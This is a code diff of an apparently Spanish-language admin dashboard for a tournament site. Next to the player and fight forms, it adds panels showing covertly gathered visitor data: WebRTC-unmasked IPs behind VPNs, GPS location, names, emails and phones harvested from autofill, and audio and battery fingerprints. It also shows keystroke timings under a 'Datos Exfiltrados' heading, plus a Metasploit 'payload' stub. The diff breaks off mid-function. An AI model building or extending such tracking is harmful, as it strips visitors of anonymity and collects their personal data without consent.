@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Valhala � Security Dashboard</title>
+<title>Valhala — Security Dashboard</title>
 <style>
 :root {
   --bg:       #0b0d12;
@@ -170,6 +170,67 @@ td.mono { font-family:'Courier New',monospace; font-size:11px; }
   flex-shrink:0; max-width:220px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
 }
 td small { display:block; color:var(--muted); font-size:10px; margin-top:2px; }
+
+/* ── FORENSIC SECTIONS ───────────────────────────────────────────── */
+.forensic-section, .vulnerability-section {
+  margin-top:20px; padding:16px; background:#0e1017; border:1px solid var(--border); border-radius:8px;
+}
+.forensic-section h4, .vulnerability-section h4 {
+  margin:0 0 12px 0; font-size:14px; color:var(--accent); font-weight:600;
+}
+.decoded-data {
+  font-family:monospace; font-size:12px; background:#0a0b0f; padding:12px; border-radius:6px;
+  white-space:pre-wrap; word-break:break-all; max-height:200px; overflow-y:auto;
+}
+.vulnerability-item {
+  padding:8px 12px; margin:4px 0; background:#0a0b0f; border-radius:6px; border-left:3px solid var(--warn);
+  font-size:13px; position:relative;
+}
+.vulnerability-item .vuln-type {
+  font-size:11px; color:var(--muted); font-style:italic; float:right;
+}
+
+/* ── LIVE FEED ─────────────────────────────────────────────────── */
+.live-feed-section {
+  margin:20px 24px; padding:16px; background:var(--surface); border:1px solid var(--border); border-radius:12px;
+}
+.live-feed-section h3 {
+  margin:0 0 16px 0; font-size:16px; color:var(--accent); font-weight:600;
+}
+.live-feed {
+  max-height:300px; overflow-y:auto; background:#0a0b0f; border-radius:8px; padding:12px;
+  font-family:monospace; font-size:12px; line-height:1.4;
+}
+.live-entry {
+  margin:8px 0; padding:8px 12px; background:#0e1017; border-radius:6px; border-left:3px solid var(--safe);
+  animation:fadeIn 0.5s ease-in;
+}
+.live-entry.danger { border-left-color:var(--danger); }
+.live-entry.warn { border-left-color:var(--warn); }
+@keyframes fadeIn { from{opacity:0; transform:translateY(-10px)} to{opacity:1; transform:translateY(0)} }
+
+/* ── ADVANCED SECTIONS ───────────────────────────────────── */
+.advanced-fingerprint-section, .user-behavior-section, .network-info-section {
+  margin-top:20px; padding:16px; background:#0e1017; border-radius:8px; border:1px solid var(--border);
+}
+.advanced-fingerprint-section h4, .user-behavior-section h4, .network-info-section h4 {
+  margin-bottom:12px; color:var(--accent); font-size:14px; font-weight:600;
+}
+.fingerprint-item, .behavior-item, .network-item {
+  margin:6px 0; font-size:13px; color:var(--text2);
+}
+.fingerprint-item strong, .behavior-item strong, .network-item strong {
+  color:var(--text); margin-right:8px;
+}
+
+/* ── TABLE ADVANCED COLUMN ───────────────────────────────────── */
+.sessions-table-wrap table th:last-child,
+.sessions-table-wrap table td:last-child {
+  width: 120px; text-align: center;
+}
+.sessions-table-wrap table td:last-child {
+  font-size: 16px;
+}
 </style>
 </head>
 <body>
@@ -192,18 +253,18 @@ td small { display:block; color:var(--muted); font-size:10px; margin-top:2px; }
         </defs>
       </svg>
       <h1>Valhala Security</h1>
-      <p>Panel de Administraci�n � Acceso Restringido</p>
+      <p>Panel de Administración — Acceso Restringido</p>
     </div>
     <div class="login-field">
       <label>Usuario</label>
       <input type="text" id="l-user" placeholder="admin" autocomplete="username">
     </div>
     <div class="login-field">
-      <label>Contrase�a</label>
-      <input type="password" id="l-pass" placeholder="��������" autocomplete="current-password"
+      <label>Contraseña</label>
+      <input type="password" id="l-pass" placeholder="••••••••" autocomplete="current-password"
         onkeydown="if(event.key==='Enter') attemptLogin()">
     </div>
-    <button class="login-btn" onclick="attemptLogin()">Iniciar Sesi�n</button>
+    <button class="login-btn" onclick="attemptLogin()">Iniciar Sesión</button>
     <div id="login-error"></div>
   </div>
 </div>
@@ -215,36 +276,188 @@ td small { display:block; color:var(--muted); font-size:10px; margin-top:2px; }
   <div class="topbar">
     <div class="topbar-brand">
       <div class="dot"></div>
-      Valhala � Security Dashboard
+      Valhala — Security Dashboard
     </div>
     <div class="topbar-right">
       <span class="timer" id="next-refresh">Actualizando en 30s</span>
-      <button class="logout-btn" onclick="doLogout()">Cerrar Sesi�n</button>
+      <button class="logout-btn" onclick="doLogout()">Cerrar Sesión</button>
     </div>
   </div>
 
   <div class="kpi-row">
     <div class="kpi"><div class="kpi-label">Total Sesiones</div><div class="kpi-val accent" id="k-total">0</div></div>
-    <div class="kpi"><div class="kpi-label">Perfiles �nicos</div><div class="kpi-val accent" id="k-profiles">0</div></div>
+    <div class="kpi"><div class="kpi-label">Perfiles Únicos</div><div class="kpi-val accent" id="k-profiles">0</div></div>
     <div class="kpi"><div class="kpi-label">VPN Detectadas</div><div class="kpi-val warn" id="k-vpn">0</div></div>
     <div class="kpi"><div class="kpi-label">Spamhaus / Botnet</div><div class="kpi-val danger" id="k-spam">0</div></div>
     <div class="kpi"><div class="kpi-label">Atacantes Multi-IP</div><div class="kpi-val danger" id="k-multi">0</div></div>
     <div class="kpi"><div class="kpi-label">Sesiones Limpias</div><div class="kpi-val safe" id="k-clean">0</div></div>
   </div>
 
+  <div class="kpi-row">
+    <div class="kpi"><div class="kpi-label">Fingerprinting Avanzado</div><div class="kpi-val accent" id="k-fingerprint">0</div></div>
+    <div class="kpi"><div class="kpi-label">Comportamiento Rastreado</div><div class="kpi-val accent" id="k-behavior">0</div></div>
+    <div class="kpi"><div class="kpi-label">Análisis de Red</div><div class="kpi-val accent" id="k-network">0</div></div>
+  </div>
+
   <div class="filter-bar">
-    <input type="search" id="search-box" placeholder="&#x1F50D; Buscar por IP, fbclid, fuente�" oninput="applyFilters()">
+    <input type="search" id="search-box" placeholder="&#x1F50D; Buscar por IP, fbclid, fuente…" oninput="applyFilters()">
     <button class="fbtn active" id="f-all"      onclick="setFilter('all')">Todos</button>
     <button class="fbtn warn-btn"   id="f-vpn"  onclick="setFilter('vpn')">&#x26A0; VPN</button>
     <button class="fbtn danger-btn" id="f-spam" onclick="setFilter('spam')">&#x1F9A0; Spamhaus</button>
     <button class="fbtn danger-btn" id="f-attacker" onclick="setFilter('attacker')">&#x1F6A8; Multi-IP</button>
-    <button class="fbtn"            id="f-24h"  onclick="setFilter('24h')">�ltimas 24h</button>
+    <button class="fbtn"            id="f-24h"  onclick="setFilter('24h')">Últimas 24h</button>
     <button class="fbtn"            id="f-fb"   onclick="setFilter('fb')">&#x1F4D8; Facebook</button>
     <button class="refresh-btn"     onclick="loadData()">&#x21BB; Actualizar</button>
   </div>
 
   <div class="cards-container" id="cards-container">
-    <div class="no-data skeleton">Cargando datos de seguridad�</div>
+    <div class="no-data skeleton">Cargando datos de seguridad…</div>
+  </div>
+
+  <div class="live-feed-section">
+    <h3>Feed de Telemetría en Vivo</h3>
+    <div class="live-feed" id="live-feed">
+      <div class="no-data">Esperando datos en vivo...</div>
+    </div>
+  </div>
+
+  <!-- ── TOP PERSONAJES ──────────────────────────────────────────────── -->
+  <div class="live-feed-section" id="personajes-section" style="margin-top:24px">
+    <h3>🎭 Top Personajes del Jugador</h3>
+    <p style="font-size:.82rem;color:var(--muted);margin:6px 0 16px">Asigna los 3 personajes más usados. Aparecen en la ficha del competidor.</p>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;max-width:680px">
+      <div style="grid-column:1/-1">
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Jugador</label>
+        <select id="pc-player" style="width:100%;padding:8px 10px;background:#0f141b;border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+          <option value="">— Selecciona jugador —</option>
+        </select>
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Personaje Principal</label>
+        <input id="pc-char1" type="text" placeholder="Ej: Naruto Uzumaki" style="width:100%;padding:8px 10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Personaje Secundario</label>
+        <input id="pc-char2" type="text" placeholder="Ej: Sasuke Uchiha" style="width:100%;padding:8px 10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Personaje Alterno</label>
+        <input id="pc-char3" type="text" placeholder="Ej: Itachi Uchiha" style="width:100%;padding:8px 10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+      </div>
+      <div style="grid-column:1/-1;display:flex;align-items:center;gap:14px;margin-top:4px">
+        <button onclick="guardarPersonajes()" style="padding:10px 24px;background:#D4AF37;border:none;border-radius:9px;color:#0d1117;font-weight:800;font-size:.88rem;cursor:pointer;letter-spacing:.05em">🎭 GUARDAR PERSONAJES</button>
+        <span id="pc-msg" style="font-size:.82rem;color:rgba(255,255,255,.45)"></span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── PRÓXIMAS PELEAS ──────────────────────────────────────────────── -->
+  <div class="live-feed-section" id="proximas-section" style="margin-top:24px">
+    <h3>📅 Programar Próxima Pelea</h3>
+    <p style="font-size:.82rem;color:var(--muted);margin:6px 0 16px">Los enfrentamientos programados se muestran en la página de Inicio y en Competidores.</p>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;max-width:680px" id="pp-form">
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Jugador 1</label>
+        <select id="pp-p1" style="width:100%;padding:8px 10px;background:#0f141b;border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+          <option value="">— Selecciona jugador —</option>
+        </select>
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Jugador 2</label>
+        <select id="pp-p2" style="width:100%;padding:8px 10px;background:#0f141b;border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+          <option value="">— Selecciona jugador —</option>
+        </select>
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Fecha del evento</label>
+        <input id="pp-date" type="date" style="width:100%;padding:8px 10px;background:#0f141b;border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Nombre del evento</label>
+        <input id="pp-event" type="text" placeholder="Bellator RolBattle Ep.1" style="width:100%;padding:8px 10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">División (opcional)</label>
+        <input id="pp-div" type="text" placeholder="Ej: División Ciudad" style="width:100%;padding:8px 10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Notas (opcional)</label>
+        <input id="pp-notes" type="text" placeholder="Ej: Pelea estelar" style="width:100%;padding:8px 10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+      </div>
+      <div style="grid-column:1/-1;display:flex;align-items:center;gap:14px;margin-top:4px">
+        <button onclick="programarPelea()" style="padding:10px 24px;background:#D4AF37;border:none;border-radius:9px;color:#0d1117;font-weight:800;font-size:.88rem;cursor:pointer;letter-spacing:.05em">📅 PROGRAMAR PELEA</button>
+        <span id="pp-msg" style="font-size:.82rem;color:rgba(255,255,255,.45)"></span>
+      </div>
+    </div>
+    <!-- Peleas programadas -->
+    <div style="margin-top:22px">
+      <div style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:12px">Peleas programadas</div>
+      <div id="pp-list" style="max-width:780px"><div style="color:rgba(255,255,255,.25);font-size:.82rem">Cargando...</div></div>
+    </div>
+  </div>
+
+  <!-- ── REGISTRAR COMBATE ─────────────────────────────────────────── -->
+  <div class="live-feed-section" id="combate-section" style="margin-top:24px">
+    <h3>⚔️ Registrar Combate</h3>
+    <p style="font-size:.82rem;color:var(--muted);margin:6px 0 18px">Al registrar un combate se actualiza automáticamente el récord (W/L/D) y la racha de ambos jugadores.</p>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;max-width:680px" id="combate-form">
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Jugador 1</label>
+        <select id="cf-p1" style="width:100%;padding:8px 10px;background:#0f141b;border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+          <option value="">— Selecciona jugador —</option>
+        </select>
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Jugador 2</label>
+        <select id="cf-p2" style="width:100%;padding:8px 10px;background:#0f141b;border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+          <option value="">— Selecciona jugador —</option>
+        </select>
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Resultado</label>
+        <select id="cf-result" style="width:100%;padding:8px 10px;background:#0f141b;border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+          <option value="player1">🏆 Gana Jugador 1</option>
+          <option value="player2">🏆 Gana Jugador 2</option>
+          <option value="draw">🤝 Empate</option>
+        </select>
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Fecha del evento</label>
+        <input id="cf-date" type="date" style="width:100%;padding:8px 10px;background:#0f141b;border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Nombre del evento</label>
+        <input id="cf-event" type="text" placeholder="Torneo Bellator 2026" style="width:100%;padding:8px 10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">División</label>
+        <input id="cf-division" type="text" placeholder="Ej: División Ciudad" style="width:100%;padding:8px 10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Personaje J1 (opcional)</label>
+        <input id="cf-char1" type="text" placeholder="Ej: Naruto" style="width:100%;padding:8px 10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+      </div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Personaje J2 (opcional)</label>
+        <input id="cf-char2" type="text" placeholder="Ej: Sasuke" style="width:100%;padding:8px 10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+      </div>
+      <div style="grid-column:1/-1">
+        <label style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px">Notas (opcional)</label>
+        <input id="cf-notes" type="text" placeholder="Ej: Final de ronda 3, victoria por decisión" style="width:100%;padding:8px 10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#fff;font-size:.88rem">
+      </div>
+      <div style="grid-column:1/-1;display:flex;align-items:center;gap:14px;margin-top:4px">
+        <button onclick="registrarCombate()" style="padding:10px 24px;background:#D4AF37;border:none;border-radius:9px;color:#0d1117;font-weight:800;font-size:.88rem;cursor:pointer;letter-spacing:.05em">⚔️ REGISTRAR COMBATE</button>
+        <span id="cf-msg" style="font-size:.82rem;color:rgba(255,255,255,.45)"></span>
+      </div>
+    </div>
+
+    <!-- Historial reciente -->
+    <div style="margin-top:26px">
+      <div style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:12px">Últimos 20 combates registrados</div>
+      <div id="cf-recent" style="max-width:780px">
+        <div style="color:rgba(255,255,255,.25);font-size:.82rem">Cargando...</div>
+      </div>
+    </div>
   </div>
 </div>
 
@@ -260,6 +473,13 @@ let refreshTimer = 30;
 let refreshInterval, countdownInterval;
 const geoCache = {};
 
+// ─── Configuración del Hosting ────────────────────────────────────────────
+const API_BASE_URL = window.location.origin; // Automáticamente usa el dominio del hosting
+const API_ENDPOINTS = {
+    adminLogin: `${API_BASE_URL}/api/admin/login`,
+    visitors: `${API_BASE_URL}/api/visitors`
+};
+
 // ───────────────────────────────────────────────────────────────
 // LOGIN
 // ───────────────────────────────────────────────────────────────
@@ -269,7 +489,7 @@ async function attemptLogin() {
   const errEl = document.getElementById('login-error');
   errEl.style.display = 'none';
   try {
-    const res  = await fetch('/api/admin/login', {
+    const res  = await fetch(API_ENDPOINTS.adminLogin, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ username: user, password: pass })
@@ -277,7 +497,7 @@ async function attemptLogin() {
     const data = await res.json();
     if (!res.ok) {
       const rem = data.remaining !== undefined ? ` (${data.remaining} intentos restantes)` : '';
-      errEl.textContent  = (data.error || 'Error de autenticaci�n') + rem;
+      errEl.textContent  = (data.error || 'Error de autenticación') + rem;
       errEl.style.display = 'block';
       return;
     }
@@ -309,12 +529,12 @@ function showDashboard() {
 function startAutoRefresh() {
   clearInterval(refreshInterval);
   clearInterval(countdownInterval);
-  refreshTimer = 30;
-  refreshInterval   = setInterval(() => { loadData(); refreshTimer = 30; }, 30000);
+  refreshTimer = 5; // Live feed every 5 seconds
+  refreshInterval   = setInterval(() => { loadData(); refreshTimer = 5; }, 5000);
   countdownInterval = setInterval(() => {
     refreshTimer--;
     document.getElementById('next-refresh').textContent = `Actualizando en ${refreshTimer}s`;
-    if (refreshTimer <= 0) refreshTimer = 30;
+    if (refreshTimer <= 0) refreshTimer = 5;
   }, 1000);
 }
 
@@ -323,13 +543,14 @@ function startAutoRefresh() {
 // ───────────────────────────────────────────────────────────────
 async function loadData() {
   try {
-    const res = await fetch('/api/visitors', {
+    const res = await fetch(API_ENDPOINTS.visitors, {
       headers: { 'Authorization': 'Bearer ' + jwtToken }
     });
     if (res.status === 401) { doLogout(); return; }
     allData = await res.json() || [];
     updateKPIs();
     applyFilters();
+    updateLiveFeed(allData);
     enrichGeo(allData).then(() => applyFilters()); // geolocalizar en segundo plano
   } catch (e) {
     document.getElementById('cards-container').innerHTML =
@@ -387,6 +608,11 @@ function updateKPIs() {
   document.getElementById('k-multi').textContent    = multiIPs;
   document.getElementById('k-clean').textContent    = allData.filter(v =>
     !v.vpn_detectada && (!v.spamhaus_status || v.spamhaus_status === 'clean')).length;
+
+  // Nuevos KPIs para datos avanzados
+  document.getElementById('k-fingerprint').textContent = allData.filter(v => v.advanced_fingerprint).length;
+  document.getElementById('k-behavior').textContent    = allData.filter(v => v.user_behavior).length;
+  document.getElementById('k-network').textContent     = allData.filter(v => v.network_info).length;
 }
 
 // ───────────────────────────────────────────────────────────────
@@ -452,24 +678,24 @@ function renderCards(data) {
     const lastLabel  = lastSeen ? new Date(lastSeen).toLocaleString('es-ES') : '-';
     const fbCids     = [...new Set(sessions.map(s => s.fb_click_id).filter(b => b && b !== 'no-fbclid'))];
     const cid        = 'c' + fp.substring(0,12).replace(/[^a-z0-9]/gi,'_');
-    // Identidad capturada: pseud�nimo visible + nombre/email de autofill
+    // Identidad capturada: pseudónimo visible + nombre/email de autofill
     const ident      = sessions.find(s => s.pseudonimo || s.nombre_real || s.email_capturado);
     const identLabel = ident
-      ? escH([ident.pseudonimo, ident.nombre_real, ident.email_capturado].filter(Boolean).join(' � '))
-      : '<em style="color:var(--muted)">An�nimo</em>';
-    // Avatar del jugador (primera sesi�n con avatar_url)
+      ? escH([ident.pseudonimo, ident.nombre_real, ident.email_capturado].filter(Boolean).join(' · '))
+      : '<em style="color:var(--muted)">Anónimo</em>';
+    // Avatar del jugador (primera sesión con avatar_url)
     const avatarSess = sessions.find(s => s.avatar_url && s.avatar_url.startsWith('http'));
     const avatarHTML = avatarSess
       ? `<img src="${escH(avatarSess.avatar_url)}" onerror="this.style.display='none'" style="width:32px;height:32px;border-radius:50%;object-fit:cover;border:1px solid rgba(180,80,255,0.6);vertical-align:middle;margin-right:6px;">`
       : '';
-    // Geolocalizaci�n: GPS exacto primero, luego IP geo como fallback
+    // Geolocalización: GPS exacto primero, luego IP geo como fallback
     const gpsSess    = [...sessions].reverse().find(s => s.gps_location && s.gps_location.trim());
     const ipSess     = [...sessions].reverse().find(s => s.ip_real_webrtc && geoCache[s.ip_real_webrtc]);
     const geo        = ipSess ? geoCache[ipSess.ip_real_webrtc] : null;
     const geoLabel   = gpsSess
       ? `?? ${escH(gpsSess.gps_location)}`
       : (geo ? `${countryFlag(geo.countryCode)} ${[geo.city, geo.country].filter(Boolean).join(', ')}` : '');
-    // OS / Navegador del �ltimo UA disponible
+    // OS / Navegador del último UA disponible
     const uaSess     = sessions.find(s => s.user_agent);
     const { os, browser, icon: di } = parseUA(uaSess ? uaSess.user_agent : '');
     const osBrowser  = uaSess ? `${di} ${os} \u00b7 ${browser}` : '';
@@ -491,11 +717,39 @@ function renderCards(data) {
     <div class="sessions-table-wrap">
       <table>
         <thead><tr>
-          <th>Fecha</th><th>Ubicaci�n Real / IP</th><th>VPN</th><th>Spamhaus</th>
-          <th>Pseud�nimo</th><th>Nombre</th><th>Email</th><th>Tel</th><th>Divisi�n</th><th>Dispositivo</th>
+          <th>Fecha</th><th>Ubicación Real / IP</th><th>VPN</th><th>Spamhaus</th>
+          <th>Pseudónimo</th><th>Nombre</th><th>Email</th><th>Tel</th><th>División</th><th>Dispositivo</th><th>Datos Avanzados</th>
         </tr></thead>
         <tbody>${sessions.map(renderRow).join('')}</tbody>
       </table>
+    </div>
+    <div class="forensic-section">
+      <h4>Datos Exfiltrados y Análisis Completo</h4>
+      <div class="decoded-data">${decodeAndHighlight(sessions.map(s => `
+        <strong>Sesión ${new Date(s.timestamp).toLocaleString('es-ES')}</strong><br>
+        IP: ${s.ip_real_webrtc || 'N/A'} | ISP: ${s.isp || 'N/A'}<br>
+        Email: ${s.email_capturado || 'N/A'} | Nombre: ${s.nombre_real || 'N/A'} | Tel: ${s.telefono || 'N/A'}<br>
+        Fingerprint: ${s.advanced_fingerprint ? 'Audio: ' + (s.advanced_fingerprint.audioHash || 'N/A') + ', Batería: ' + (s.advanced_fingerprint.batteryLevel ? (s.advanced_fingerprint.batteryLevel * 100) + '%' : 'N/A') : 'No disponible'}<br>
+        Comportamiento: Mouse: ${s.user_behavior ? s.user_behavior.mouseMoves || 0 : 0}, Keys: ${s.user_behavior ? s.user_behavior.keyPresses || 0 : 0}, Clicks: ${s.user_behavior ? s.user_behavior.clicks || 0 : 0}<br>
+        Red: WebRTC IPs: ${s.network_info ? s.network_info.localIPs ? s.network_info.localIPs.length : 0 : 0}, Conexión: ${s.network_info ? s.network_info.connectionType || 'N/A' : 'N/A'}<br>
+        <hr style="border: none; border-top: 1px solid var(--border); margin: 8px 0;">
+      `).join(''))}</div>
+    </div>
+    <div class="vulnerability-section">
+      <h4>Mapa de Vulnerabilidades del Servidor</h4>
+      <div class="vulnerability-map">${renderVulnerabilityMap(sessions.find(s => s.vulnerabilities)?.vulnerabilities || [])}</div>
+    </div>
+    <div class="advanced-fingerprint-section">
+      <h4>Fingerprinting Avanzado</h4>
+      <div class="advanced-fingerprint">${renderAdvancedFingerprint(sessions.find(s => s.advanced_fingerprint))}</div>
+    </div>
+    <div class="user-behavior-section">
+      <h4>Comportamiento del Usuario</h4>
+      <div class="user-behavior">${renderUserBehavior(sessions.find(s => s.user_behavior))}</div>
+    </div>
+    <div class="network-info-section">
+      <h4>Análisis de Red Avanzado</h4>
+      <div class="network-info">${renderNetworkInfo(sessions.find(s => s.network_info))}</div>
     </div>
   </div>
 </div>`;
@@ -539,7 +793,8 @@ function renderRow(v) {
     <td>${vpnTag}</td><td>${spamTag}</td>
     <td>${avatar}${pseudo}</td>
     <td>${nombre}</td><td>${email}</td><td>${tel}</td><td>${div}</td>
-    <td title="${escH(v.user_agent||'')}">${di} ${escH(os)} � ${escH(browser)}</td>
+    <td title="${escH(v.user_agent||'')}">${di} ${escH(os)} · ${escH(browser)}</td>
+    <td>${v.advanced_fingerprint ? '🖼️' : ''}${v.user_behavior ? '🖱️' : ''}${v.network_info ? '🌐' : ''}</td>
   </tr>`;
 }
 
@@ -574,11 +829,394 @@ function escH(s) {
 }
 
 // ───────────────────────────────────────────────────────────────
+// FORENSIC TOOLS
+// ───────────────────────────────────────────────────────────────
+function decodeAndHighlight(data) {
+  try {
+    // Los datos ya vienen decodificados de la API, solo resaltar
+    const text = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
+    // Resaltar términos clave
+    return text
+      .replace(/EXFILTRACIÓN DETECTADA/gi, '<span style="color:#ef4444;font-weight:bold;">EXFILTRACIÓN DETECTADA</span>')
+      .replace(/TELMEX/gi, '<span style="color:#f59e0b;font-weight:bold;">TELMEX (ISP obsoleto)</span>')
+      .replace(/VPN/gi, '<span style="color:#7c3aed;font-weight:bold;">VPN</span>')
+      .replace(/SPAM/gi, '<span style="color:#ef4444;font-weight:bold;">SPAM</span>');
+  } catch (e) {
+    return data; // Si hay error, devolver tal cual
+  }
+}
+
+function renderVulnerabilityMap(vulnerabilities) {
+  if (!vulnerabilities || vulnerabilities.length === 0) {
+    return '<div class="no-data">No se detectaron vulnerabilidades en el servidor.</div>';
+  }
+
+  const severityColors = {
+    critical: '#ef4444',
+    high: '#f59e0b',
+    medium: '#f59e0b',
+    low: '#22c55e'
+  };
+
+  const severityLabels = {
+    critical: 'CRÍTICA',
+    high: 'ALTA',
+    medium: 'MEDIA',
+    low: 'BAJA'
+  };
+
+  return vulnerabilities.map(vuln => {
+    const severity = vuln.severity || 'medium';
+    const color = severityColors[severity] || severityColors.medium;
+    const label = severityLabels[severity] || 'MEDIA';
+
+    return `<div class="vulnerability-item" style="border-left-color: ${color}">
+      <strong style="color: ${color}">[${label}]</strong> ${vuln.description || vuln.type}
+      <span class="vuln-type">${vuln.type}</span>
+    </div>`;
+  }).join('');
+}
+
+function renderAdvancedFingerprint(fingerprint) {
+  if (!fingerprint) {
+    return '<div class="no-data">No se capturó fingerprinting avanzado.</div>';
+  }
+
+  return `
+    <div class="fingerprint-item"><strong>Audio Hash:</strong> ${fingerprint.audioHash || 'N/A'}</div>
+    <div class="fingerprint-item"><strong>Batería:</strong> ${fingerprint.batteryLevel ? (fingerprint.batteryLevel * 100) + '%' : 'N/A'} ${fingerprint.batteryCharging ? '(Cargando)' : ''}</div>
+    <div class="fingerprint-item"><strong>Permisos:</strong> ${Object.entries(fingerprint.permissions || {}).map(([k,v]) => `${k}: ${v}`).join(', ')}</div>
+    <div class="fingerprint-item"><strong>Sensores:</strong> ${fingerprint.hasOrientation ? 'Orientación ' : ''}${fingerprint.hasMotion ? 'Movimiento' : ''}</div>
+  `;
+}
+
+function renderUserBehavior(behavior) {
+  if (!behavior) {
+    return '<div class="no-data">No se capturó comportamiento del usuario.</div>';
+  }
+
+  return `
+    <div class="behavior-item"><strong>Movimientos de Mouse:</strong> ${behavior.mouseMoves || 0}</div>
+    <div class="behavior-item"><strong>Pulsaciones de Tecla:</strong> ${behavior.keyPresses || 0}</div>
+    <div class="behavior-item"><strong>Scrolls:</strong> ${behavior.scrolls || 0}</div>
+    <div class="behavior-item"><strong>Clicks:</strong> ${behavior.clicks || 0}</div>
+    <div class="behavior-item"><strong>Timings de Keystroke:</strong> ${behavior.keystrokeTimings ? behavior.keystrokeTimings.slice(0, 5).join('ms, ') + 'ms...' : 'N/A'}</div>
+  `;
+}
+
+function renderNetworkInfo(network) {
+  if (!network) {
+    return '<div class="no-data">No se capturó información de red avanzada.</div>';
+  }
+
+  return `
+    <div class="network-item"><strong>Candidatos WebRTC:</strong> ${network.webrtcCandidates || 0}</div>
+    <div class="network-item"><strong>IPs Locales:</strong> ${network.localIPs ? network.localIPs.join(', ') : 'N/A'}</div>
+    <div class="network-item"><strong>Riesgo DNS Leak:</strong> ${network.dnsLeakPotential || 'N/A'}</div>
+    <div class="network-item"><strong>Tipo de Conexión:</strong> ${network.connectionType || 'N/A'}</div>
+    <div class="network-item"><strong>Velocidad:</strong> ${network.downlink ? network.downlink + ' Mbps' : 'N/A'}</div>
+  `;
+}
+
+function simulatePayload(module) {
+  alert(`Simulando ejecución de payload Metasploit: ${module}\n\nEsto es solo una demostración educativa.`);
+}
+
+function updateLiveFeed(data) {
+  const feed = document.getElementById('live-feed');
+  if (!data || data.length === 0) return;
+
+  // Filtrar datos válidos y recientes (últimas 24 horas)
+  const now = new Date();
+  const validData = data.filter(entry => {
+    if (!entry.timestamp) return false;
